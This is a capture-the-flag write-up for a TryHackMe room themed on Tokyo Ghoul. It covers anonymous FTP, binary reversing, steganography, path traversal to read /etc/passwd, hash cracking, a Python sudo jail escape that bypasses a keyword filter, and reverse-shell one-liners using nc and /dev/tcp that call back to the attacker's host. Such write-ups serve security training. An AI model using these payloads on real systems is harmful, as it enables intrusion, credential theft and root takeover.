## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Help kaneki escape jason room
wzebi dyalmn????
This room took a lot of inspiration from [psychobreak](https://tryhackme.com/room/psychobreak) , and it is based on Tokyo Ghoul anime.
Alert: This room can contain some spoilers 'only s1 and s2 ' so if you are interested to watch the anime, wait till you finish the anime and come back to do the room 
The machine will take some time, just go grab some water or make a coffee.
**This room contains some non-pg13 elements in the form of narrative descriptions. Please proceed only at your own comfort level.**
```

## IP-Address
```IP-Address
10.49.182.86
```

## RustScan
```bash
$ rustscan -a 10.49.182.86 -b 450 -t 2000 --ulimit 5000 -- -e tun0 -sC -sV > Network.txt

Open 10.49.182.86:22
Open 10.49.182.86:21
Open 10.49.182.86:80

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 need_Help?
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.157.252
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fa:9e:38:d3:95:df:55:ea:14:c9:49:d8:0a:61:db:5e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeIXT46ZiVmp8Es0cKk8YkMs3kwCdmC2Ve/0A0F7aKUIOlbyLc9FkbTEGSrE69obV3u6VywjxZX6VWQoJRHLooPmZCHkYGjW+y5kfEoyeu7pqZr7oA8xgSRf+gsEETWqPnSwjTznFaZ0T1X0KfIgCidrr9pWC0c2AxC1zxNPz9p13NJH5n4RUSYCMOm2xSIwUr6ySL3v/jijwEKIMnwJHbEOmxhGrzaAXgAJeGkXUA0fU1mTVLlSwOClKOBTTo+FGcJdrFf65XenUVLaqaQGytKxR2qiCkr7bbTaWV0F8jPtVD4zOXLy2rGoozMU7jAukQu6uaDxpE7BiybhV3Ac1x
|   256 ad:b7:a7:5e:36:cb:32:a0:90:90:8e:0b:98:30:8a:97 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC5o77nOh7/3HUQAxhtNqHX7LGDtYoVZ0au6UJzFVsAEJ644PyU2/pALbapZwFEQI3AUZ5JxjylwKzf1m+G5OJM=
|   256 a2:a2:c8:14:96:c5:20:68:85:e5:41:d0:aa:53:8b:bd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOJwYjN/qiwrS4es9m/LgWitFMA0f6AJMTi8aHkYj7vE
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Welcome To Tokyo goul
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Look At Web 
- Visit `http://10.49.182.86`
```bash

```

## FTP
```bash
$ ftp 10.49.182.86
Connected to 10.49.182.86.
220 (vsFTPd 3.0.3)
Name (10.49.182.86:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> lws
?Invalid command.
ftp> ls
229 Entering Extended Passive Mode (|||42226|)
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 need_Help?
226 Directory send OK.
ftp> cd need_Help?
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||45001|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           480 Jan 23  2021 Aogiri_tree.txt
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2021 Talk_with_me
226 Directory send OK.
ftp> cd Talk_with_me
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||44881|)
150 Here comes the directory listing.
-rwxr-xr-x    1 ftp      ftp         17488 Jan 23  2021 need_to_talk
-rw-r--r--    1 ftp      ftp         46674 Jan 23  2021 rize_and_kaneki.jpg
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||42344|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2021 .
drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 ..
-rwxr-xr-x    1 ftp      ftp         17488 Jan 23  2021 need_to_talk
-rw-r--r--    1 ftp      ftp         46674 Jan 23  2021 rize_and_kaneki.jpg
226 Directory send OK.
ftp>
```

in Files 
- Aogiri_tree.txt
```file
Why are you so late?? i've been waiting for too long .
So i heard you need help to defeat Jason , so i'll help you to do it and i know you are wondering how i will. 
I knew Rize San more than anyone and she is a part of you, right?
That mean you got her kagune , so you should activate her Kagune and to do that you should get all control to your body , i'll help you to know Rise san more and get her kagune , and don't forget you are now a part of the Aogiri tree .
Bye Kaneki.
```
- need_to_talk
```bash
$ file need_to_talk
need_to_talk: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=adba55165982c79dd348a1b03c32d55e15e95cf6, for GNU/Linux 3.2.0, not stripped
```

- File is a `C` program which is disassemble using `gdb`
```bash
$ gdb ./need_to_talk

GNU gdb (Debian 17.1-1) 17.1
Copyright (C) 2025 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./need_to_talk...
(No debugging symbols found in ./need_to_talk)
(gdb) disassemble check_password
Dump of assembler code for function check_password:
   0x00000000000012e9 <+0>:     push   %rbp
   0x00000000000012ea <+1>:     mov    %rsp,%rbp
   0x00000000000012ed <+4>:     sub    $0x100,%rsp
   0x00000000000012f4 <+11>:    lea    0xe52(%rip),%rdi        # 0x214d
   0x00000000000012fb <+18>:    mov    $0x0,%eax
   0x0000000000001300 <+23>:    call   0x1080 <printf@plt>
   0x0000000000001305 <+28>:    mov    0x2db4(%rip),%rdx        # 0x40c0 <stdin@@GLIBC_2.2.5>
   0x000000000000130c <+35>:    lea    -0x100(%rbp),%rax
   0x0000000000001313 <+42>:    mov    $0xff,%esi
   0x0000000000001318 <+47>:    mov    %rax,%rdi
   0x000000000000131b <+50>:    call   0x1090 <fgets@plt>
   0x0000000000001320 <+55>:    lea    -0x100(%rbp),%rax
   0x0000000000001327 <+62>:    mov    %rax,%rdi
   0x000000000000132a <+65>:    call   0x1060 <strlen@plt>
   0x000000000000132f <+70>:    sub    $0x1,%rax
   0x0000000000001333 <+74>:    movb   $0x0,-0x100(%rbp,%rax,1)
   0x000000000000133b <+82>:    mov    0x2d3e(%rip),%rdx        # 0x4080 <the_password>
   0x0000000000001342 <+89>:    lea    -0x100(%rbp),%rax
   0x0000000000001349 <+96>:    mov    %rdx,%rsi
   0x000000000000134c <+99>:    mov    %rax,%rdi
   0x000000000000134f <+102>:   call   0x10a0 <strcmp@plt>
   0x0000000000001354 <+107>:   test   %eax,%eax
   0x0000000000001356 <+109>:   jne    0x135f <check_password+118>
   0x0000000000001358 <+111>:   mov    $0x1,%eax
   0x000000000000135d <+116>:   jmp    0x1364 <check_password+123>
   0x000000000000135f <+118>:   mov    $0x0,%eax
   0x0000000000001364 <+123>:   leave
   0x0000000000001365 <+124>:   ret
End of assembler dump.
(gdb) x/s the_password
❌️ 'the_password' has unknown type; cast it to its declared type
(gdb) x/s (char *)the_password
0x2008: "kamishiro"
(gdb) 
```

#### Got the Password
```Pass
kamishiro
```
## File Flag
```bash
$ ./need_to_talk
Hey Kaneki finnaly you want to talk 
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?
kamishiro> 
Good job. I believe this is what you came for:
You_found_1t
```

- File `rize_and_kaneki.jpg`
```bash
$ steghide extract -sf rize_and_kaneki.jpg -p You_found_1t
wrote extracted data to "yougotme.txt".
```
- File `yougotme.txt`
```file $ cat yougotme.txt 
haha you are so smart kaneki but can you talk my code 
..... .-
....- ....-
....- -....
--... ----.
....- -..
...-- ..---
....- -..
...-- ...--
....- -..
....- ---..
....- .-
...-- .....
..... ---..
...-- ..---
....- .
-.... -.-.
-.... ..---
-.... .
..... ..---
-.... -.-.
-.... ...--
-.... --...
...-- -..
...-- -..
if ou can talk it allright you got my secret directory 
```
- This is `Morse code` After Decoding it is
```Decode
5A4446794D324D334D484A3558324E6C626E526C63673D3D
```
- This is also an encryption which is `Hex`
```Decode
ZDFyM2M3MHJ5X2NlbnRlcg==
```
- This is also encrypt with `base64`
```Decode
d1r3c70ry_center
```
- This is the Web Directory
```html
<html>
<head>
	<title>Scan me</title>
	<link rel="stylesheet" type="text/css" href="../css/mainstylesheet.css">
</head>
<body>

	<h1 style="text-align: center;">Scan me </h1>
	<div class="center-wrapper">
		<img src="scanme.gif">
	</div>
	<p> Scan me scan me scan all my ideas aaaaahhhhhhhh </p>
</body>
</html>
```
- Use Gobuster now
```bash
$ gobuster dir -u http://10.49.182.86/d1r3c70ry_center/ \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,json,txt \
-t 50
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.182.86/d1r3c70ry_center/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,json,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/claim                (Status: 301) [Size: 329] [--> http://10.49.182.86/d1r3c70ry_center/claim/]
```
- Visit `http://10.49.182.86/d1r3c70ry_center/claim/`
```html
<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=IBM+Plex+Sans" rel="stylesheet"> 
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?view=flower.gif">NO</a>
	    <a href="index.php?view=flower.gif">YES</a>
	</div>
 <p><b>Welcome Kankei-Ken</b><br><br>So you are here , you make the desision , you really want the power ? 
 Will you accept me? 
 Will accept your self as a ghoul?</br></p>
    <img src='https://i.imgur.com/9joyFGm.gif'>    </body>
</html>
```
- Got Hint From here `index.php?view=flower.gif`
- Visit `http://10.49.182.86/d1r3c70ry_center/claim/index.php?view=flower.gif`
- Lets Edit the flower.gif with /../../../etc/password
```html
<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=IBM+Plex+Sans" rel="stylesheet"> 
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?view=flower.gif">NO</a>
	    <a href="index.php?view=flower.gif">YES</a>
	</div>
no no no silly don't do that
```
- Let's encode `/../../../etc/passwd` into `URLEncode`
```URLEncode
%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
```
- Burp Request
```Req.
GET /d1r3c70ry_center/claim/index.php?view=%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd HTTP/1.1
Host: 10.49.182.86
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=hv69oj6nen72a2ltf2hije53p2
Connection: keep-alive
```
- Result
```html
HTTP/1.1 200 OK
Date: Wed, 14 Jan 2026 04:01:44 GMT
Server: Apache/2.4.18 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 2232
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=IBM+Plex+Sans" rel="stylesheet"> 
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?view=flower.gif">NO</a>
	    <a href="index.php?view=flower.gif">YES</a>
	</div>
<p>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
statd:x:110:65534::/var/lib/nfs:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
vagrant:x:1000:1000:vagrant,,,:/home/vagrant:/bin/bash
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
kamishiro:[hash omitted]:1001:1001:,,,:/home/kamishiro:/bin/bash
</p>    </body>
</html>
```
- Copy the Full Hash
```bash
$nano hash.txt
kamishiro:[hash omitted]:1001:1001:,,,:/home/kamishiro:/bin/bash
$john hash.txt -w=/usr/share/wordlists/rockyou.txt
kamishiro:[password omitted]:1001:1001:,,,:/home/kamishiro:/bin/bash
1 password hash cracked, 0 left
```
- Credentials
```Creds
kamishiro:[password omitted]
```
## SSH
```bash
kamishiro@vagrant:~$ ls
jail.py  user.txt
kamishiro@vagrant:~$ cat user.txt
[flag omitted]
kamishiro@vagrant:~$
```

## Lets Escalate 
```bash
kamishiro@vagrant:~$ cat jail.py
#! /usr/bin/python3
#-*- coding:utf-8 -*-
def main():
    print("Hi! Welcome to my world kaneki")
    print("========================================================================")
    print("What ? You gonna stand like a chicken ? fight me Kaneki")
    text = input('>>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text:
            print("Do you think i will let you do this ??????")
            return;
    else:
        exec(text)
        print('No Kaneki you are so dead')
if __name__ == "__main__":
    main()
kamishiro@vagrant:~$
```
- Let's exploit the payload
```bash
kamishiro@vagrant:~$ sudo /usr/bin/python3 /home/kamishiro/jail.py                                                   
Hi! Welcome to my world kaneki
========================================================================
What ? You gonna stand like a chicken ? fight me Kaneki
>>> __builtins__.__dict__['__imp' + 'ort__']('o' + 's').__getattribute__('sys' + 'tem')('ls')
jail.py  user.txt
No Kaneki you are so dead
kamishiro@vagrant:~$ sudo /usr/bin/python3 /home/kamishiro/jail.py
Hi! Welcome to my world kaneki
========================================================================
What ? You gonna stand like a chicken ? fight me Kaneki
>>> __builtins__.__dict__['__imp' + 'ort__']('o' + 's').__getattribute__('sys' + 'tem')('ls')^[[D^[[D^H^H^H
Traceback (most recent call last):
  File "/home/kamishiro/jail.py", line 16, in <module>
    main()
  File "/home/kamishiro/jail.py", line 13, in main
    exec(text)
  File "<string>", line 1
    __builtins__.__dict__['__imp' + 'ort__']('o' + 's').__getattribute__('sys' + 'tem')('ls')
                                                                                             ^
SyntaxError: invalid syntax
kamishiro@vagrant:~$ ls
jail.py  user.txt
kamishiro@vagrant:~$ sudo /usr/bin/python3 /home/kamishiro/jail.py
Hi! Welcome to my world kaneki
========================================================================
What ? You gonna stand like a chicken ? fight me Kaneki
>>> __builtins__.__dict__['__imp' + 'ort__']('o' + 's').__getattribute__('sys' + 'tem')('ls /root')
root.txt
No Kaneki you are so dead
kamishiro@vagrant:~$ sudo /usr/bin/python3 /home/kamishiro/jail.py
Hi! Welcome to my world kaneki
========================================================================
What ? You gonna stand like a chicken ? fight me Kaneki
>>> __builtins__.__dict__['__imp' + 'ort__']('o' + 's').__getattribute__('sys' + 'tem')('cat /root/root.txt')
[flag omitted]
No Kaneki you are so dead
kamishiro@vagrant:~$
```
## Root Shell
```bash
kamishiro@vagrant:~$ sudo /usr/bin/python3 /home/kamishiro/jail.py
Hi! Welcome to my world kaneki
========================================================================
What ? You gonna stand like a chicken ? fight me Kaneki
>>> __builtins__.__dict__['__imp' + 'ort__']('o' + 's').__getattribute__('sys' + 'tem')('0<&196;exec 196<>/dev/tcp/192.168.157.252/4444; sh <&196 >&196 2>&196')
Do you think i will let you do this ??????
kamishiro@vagrant:~$ sudo /usr/bin/python3 /home/kamishiro/jail.py
Hi! Welcome to my world kaneki
========================================================================
What ? You gonna stand like a chicken ? fight me Kaneki
>>> __builtins__.__dict__['__imp' + 'ort__']('o' + 's').__getattribute__('sys' + 'tem')('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.157.252 4444 >/tmp/f')
rm: cannot remove '/tmp/f': No such file or directory
```
- Got the Reverseshell
```bash -payload
__builtins__.__dict__['__imp' + 'ort__']('o' + 's').__getattribute__('sys' + 'tem')('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.157.252 4444 >/tmp/f')
```
- bash
```bash
# ls
jail.py
user.txt
# cd
# pwd
/home/kamishiro
# cd root
sh: 10: cd: can't cd to root
# whoami
root
# sudo -l
Matching Defaults entries for root on vagrant.vm:
    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on vagrant.vm:
    (ALL : ALL) ALL
# sudo cd root
sudo: cd: command not found
# cd roo^H^H^H
sh: 14: cd: can't cd to roo
# sudo /root
sudo: /root: command not found
# cd /root
# ls
root.txt
# cat root.txt
[flag omitted]
#
```
## Root Flag
```Flag
[flag omitted]
```

## END
